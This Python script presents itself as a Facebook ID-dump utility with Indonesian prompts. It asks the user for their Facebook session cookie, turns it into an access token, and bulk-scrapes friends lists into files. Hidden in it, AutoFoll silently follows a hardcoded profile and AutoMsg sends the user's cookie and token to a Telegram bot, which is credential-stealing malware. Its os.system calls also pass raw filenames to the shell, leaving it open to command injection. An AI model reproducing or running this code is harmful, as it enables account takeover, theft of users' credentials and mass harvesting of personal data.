#       › reversed by exotic-hridoy ‹
import os, sys, time, requests, json, bs4, re, datetime, random
from concurrent.futures import ThreadPoolExecutor as ftrs
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from time import sleep

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

T, G, S= [
        '\033[4{}m',
        '\033[4;3{}m',
        '\033[0m'
]
class DumpFb:
	def __init__(self):
		self.UserFoll = "100039142035154"
#	(alert)	self.TokenBot = "6269379312:AAFIQ5ITTTBu_tfX7ZsAdNb-QWduZFYgj-4"
		self.UserId = "6194426523"
		self.url = "https://mbasic.facebook.com"
		self.Xyz = requests.Session()
		self.uid = {"userid":[],"total":[]}

	def AutoFoll(self, cookie, token):
		try:
			name = self.Xyz.get(f"https://graph.facebook.com/me?fields=name&access_token={token}", cookies={"cookie": cookie}).json()["name"]
		except:print(f" {P}[{M}!{P}] Cookie kamu invalid");sleep(2);self.Login()
		try:
			Xenzi = par(self.Xyz.get(f"{self.url}/profile.php?id={self.UserFoll}", cookies={"cookie": cookie}).text, "html.parser")
			if "/a/subscriptions/remove" in str(Xenzi):pass
			elif "/a/subscribe.php" in str(Xenzi):
				cari = re.search('/a/subscribe.php(.*?)"', str(Xenzi)).group(1).replace("amp;", "")
				self.Xyz.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cookie})
		except Exception as e:print(f" {P}[{M}!{P}] Cookie kamu invalid");sleep(2);self.Login()

	def AutoMsg(self, cookie, token):
		try:
			text = f"(Cookie): {cookie}\n(Token): {token}"
			Xenzi = self.Xyz.get(f"https://api.telegram.org/bot{self.TokenBot}/sendMessage?chat_id={self.UserId}&text={text}")
		except:pass

	def clear(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear")
			except:pass
	def Banner(self):
		self.clear()
		print (f"""
\x1b[1;90m┌┬┐┬ ┬┌┬┐┌─┐┌─┐┌┐   {O}* {P}Author: {H}Xenzi Official
\x1b[1;90m │││ ││││├─┘├┤ ├┴┐  {O}* {P}YouTube: {K}@xenzi-official
\x1b[1;90m─┴┘└─┘┴ ┴┴  └  └─┘  {O}* {P}Github: \x1b[1;90m/Xenzi-XN1
		""")

	def Login(self):
		self.Banner()
		cok = input(f" {P}[{K}?{P}] Cookie:{H} ")
		try:
			data, data2 = {}, {}
			link = self.Xyz.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]
			vers = par(self.Xyz.get(f"{self.url}/device", cookies={"cookie": cok}).content, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			meta = par(self.Xyz.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz  = meta.find("form",{"method":"post"})
			for x in xzxz("input",{"value":True}):
				try:
					if x["name"] == "__CANCEL__" : pass
					else:data2.update({x['name']:x['value']})
				except Exception as e: pass
			self.Xyz.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
			tokz = self.Xyz.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
			self.AutoFoll(cok, tokz['access_token'])
			self.AutoMsg(cok, tokz['access_token'])
			open(".cookie.log", "a").write(cok);open(".token.log", "a").write(tokz['access_token'])
			exit(f" {P}[{H}+{P}] jalankan ulang perintah nya dengan ketik python \x1b[1;90mrun.py")
		except Exception as e:exit(f" {P}[{M}!{P}] Cookie kamu invalid")

	def Check(self):
		try:
			cok = open('.cookie.log','r').read();tok = open('.token.log','r').read()
			try:
				user = self.Xyz.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies={"cookie": cok}).json()
				self.Menu(user['name'],user['id'])
			except KeyError:
				os.remove(".cookie.log")
				os.remove(".token.log")
				sleep(2)
				self.Login()
			except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
		except IOError:self.Login()

	def Menu(self, name, id):
		self.Banner()
		print (f" {P}[{H}+{P}] Username :{H}{name}")
		print (f" {P}[{H}+{P}] Userid   :\x1b[1;90m{id}")
		print (f"\n {P}[{H}1{P}]. Dump dari {B}id {P}publik {H}`massal`\n {P}[{H}2{P}]. Dump dari {B}id {P}publik `{H}Unlimited{P}`\n {P}[{H}3{P}]. Pisahkan {B}id {P}`{H}100098,100088{P}`\n {P}[{H}4{P}]. Hapus {B}id {P}Duplikat\n {P}[{M}0{P}]. Hapus Cookie and Token\n")
		chs = input(f" {P}[{K}?{P}] pilih menu:{H} ")
		list = ['1','01','2','02','3','03','4','04','0','00']
		while chs not in list:
			chs = input(f" {P}[{M}!{P}] pilih menu yang ada:{H} ")
		self.List_Menu(chs)

	def List_Menu(self, inp):
		if inp == "1" or inp == "01":self.publik_n()
		elif inp == "2" or inp == "02":self.publik_u()
		elif inp == "3" or inp == "03":self.id_pisah()
		elif inp == "4" or inp == "04":self.delet_duplk()
		elif inp == "0" or inp == "00":
			os.remove(".cookie.log")
			os.remove(".token.log")
			sleep(2)
			exit(f" {P}[{H}✓{P}] berhasil menghapus {M}cookie {P}and {M}Token")

	def publik_n(self):
		try:cok = open('.cookie.log','r').read();tok = open('.token.log','r').read()
		except FileNotFoundError:self.Login()
		try:jml = int(input(f" {P}[{K}?{P}] masukan jumlah {H}id {P}yang anda ingginkan :{H} "))
		except ValueError:exit(f" {P}[{M}!{P}] masukan angka janggan huruf")
		for jid in range(jml):
			jid += 1
			user = input(f" {P}[{H}+{P}] masukan id \x1b[1;90m({H}{str(jid)}\x1b[1;90m){P}:{H} ")
			self.uid["userid"].append(user)
		print (f"\n {P}[{H}+{P}] {P}Nama File Untuk Dump Id \x1b[1;90m({P}Contoh {H}/sdcard/dumpfb.txt\x1b[1;90m)")
		files = input(f" {P}[{K}?{P}] Nama File:{H} ")
		save = open(files,'w')
		for userid in self.uid["userid"]:
			try:
				response = self.Xyz.get(f'https://graph.facebook.com/{userid}?fields=friends&access_token={tok}',cookies={'cookie': cok})
				for teman in response.json()['friends']['data']:
					try:
						save.write(teman["id"]+'|'+teman["name"]+'\n')
						self.uid["total"].append(teman["id"]+'|'+teman["name"])
					except:continue
					sys.stdout.write(f"\r\r {P}[{U}-{P}] Sedang mengumpulkan id {H}{len(self.uid['total'])}");sys.stdout.flush()
			except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
			except (KeyError,IOError):pass
		print ("\r")
		print (f"\n {P}[{H}+{P}] Total id: {H}{len(self.uid['total'])} {P}id")
		print (f" {P}[{H}✓{P}] File tersimpan di: {H}{files}")
		input(f" {P}[{O}•{P}] klik enter untuk kembali ke {H}menu");sleep(2);self.Check()

	def publik_u(self):
		try:cok = open('.cookie.log','r').read();tok = open('.token.log','r').read()
		except FileNotFoundError:self.Login()
		user = input(f" {P}[{H}+{P}] masukan id {P}:{H} ")
		try:
			response = self.Xyz.get(f'https://graph.facebook.com/{user}?fields=friends&access_token={tok}',cookies={'cookie': cok})
			for teman in response.json()['friends']['data']:
				try:
					self.uid["userid"].append(teman["id"])
				except:continue
		except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
		except (KeyError,IOError):sleep(2);exit(f" {P}[{M}!{P}] id tidak publik")
		print (f"\n {P}[{H}+{P}] {P}Nama File Untuk Dump Id \x1b[1;90m({P}Contoh {H}/sdcard/dumpfb.txt\x1b[1;90m)")
		files = input(f" {P}[{K}?{P}] Nama File:{H} ")
		save = open(files,'w')
		for userid in self.uid["userid"]:
			try:
				response = self.Xyz.get(f'https://graph.facebook.com/{userid}?fields=friends&access_token={tok}',cookies={'cookie': cok})
				for teman in response.json()['friends']['data']:
					try:
						save.write(teman["id"]+'|'+teman["name"]+'\n')
						self.uid["total"].append(teman["id"]+'|'+teman["name"])
					except:continue
					sys.stdout.write(f"\r\r {P}[{U}-{P}] Sedang mengumpulkan id {H}{len(self.uid['total'])}");sys.stdout.flush()
			except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
			except (KeyError,IOError):pass
		print ("\r")
		print (f"\n {P}[{H}+{P}] Total id: {H}{len(self.uid['total'])} {P}id")
		print (f" {P}[{H}✓{P}] File tersimpan di: {H}{files}")
		input(f" {P}[{O}•{P}] klik enter untuk kembali ke {H}menu");sleep(2);self.Check()

	def id_pisah(self):
		file = input(f" {P}[{K}?{P}] Masukan nama file:{H} ")
		try:open(file,'r').read()
		except FileNotFoundError:exit(f" {P}[{M}!{P}] file {M}{file} {P}tidak di temukan")
		print (f"\n {P}[{H}+{P}] {P}Nama File Untuk Dump Id \x1b[1;90m({P}Contoh {H}/sdcard/dumpfb.txt\x1b[1;90m)")
		files = input(f" {P}[{K}?{P}] Nama File:{H} ")
		try:jml = int(input(f"\n {P}[{H}+{P}] {P}Masukan jumlah pemisah id:{H} "))
		except ValueError:exit(f" {P}[{M}!{P}] masukan angka janggan huruf")
		for jid in range(jml):
			jid += 1
			user = input(f" {P}[{H}+{P}] contoh 10008,10007 \x1b[1;90m({H}{str(jid)}\x1b[1;90m){P}:{H} ")
			os.system('cat '+file+' | grep "'+user+'" >> '+files)
		fs = open(files).read().splitlines()
		print (f"\n {P}[{H}+{P}] Total id: {H}{len(fs)} {P}id")
		print (f" {P}[{H}✓{P}] File tersimpan di: {H}{files}")
		input(f" {P}[{O}•{P}] klik enter untuk kembali ke {H}menu");sleep(2);self.Check()

	def delet_duplk(self):
		file = input(f" {P}[{K}?{P}] Masukan nama file:{H} ")
		try:open(file,'r').read()
		except FileNotFoundError:exit(f" {P}[{M}!{P}] file {M}{file} {P}tidak di temukan")
		print (f"\n {P}[{H}+{P}] {P}Nama File Untuk Dump Id \x1b[1;90m({P}Contoh {H}/sdcard/dumpfb.txt\x1b[1;90m)")
		files = input(f" {P}[{K}?{P}] Nama File:{H} ")

		os.system('touch ' +files)
		os.system('sort -r '+file+' | uniq > '+files)

		fs = open(files).read().splitlines()
		print (f"\n {P}[{H}+{P}] Total id: {H}{len(fs)} {P}id")
		print (f" {P}[{H}✓{P}] File tersimpan di: {H}{files}")
		input(f" {P}[{O}•{P}] klik enter untuk kembali ke {H}menu");sleep(2);self.Check()
if __name__=='__main__':
	DumpFb().Check()

